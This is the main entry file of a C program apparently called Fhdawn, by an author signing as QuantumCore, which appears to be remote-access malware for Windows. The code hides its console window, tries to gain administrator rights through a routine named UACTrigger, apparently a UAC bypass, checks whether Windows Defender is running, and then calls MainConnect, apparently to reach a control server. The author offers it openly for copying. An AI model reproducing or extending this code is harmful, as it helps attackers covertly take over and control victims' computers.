/*
Author: Fahad (QuantumCore)
main.c (c) 2020
 
Created:  2020-08-15T15:27:04.427Z
Modified: -
*/
/*
Have a good time reading the source. You're an amazing person.
If you decide to copy, Don't forget to give me credit.
*/
#include "fhdawn.h"

int main() // entry point
{
    FreeConsole();
    
    if(auto_elevate){
        if(!IsAdmin()){
            UACTrigger();
            Sleep(2000);
            if(ProcessId("WindowsDefender.exe") != 0){
                exit(0);
            }
            exit(0);
        }
    }
    
    MainConnect();
    return 0;
}
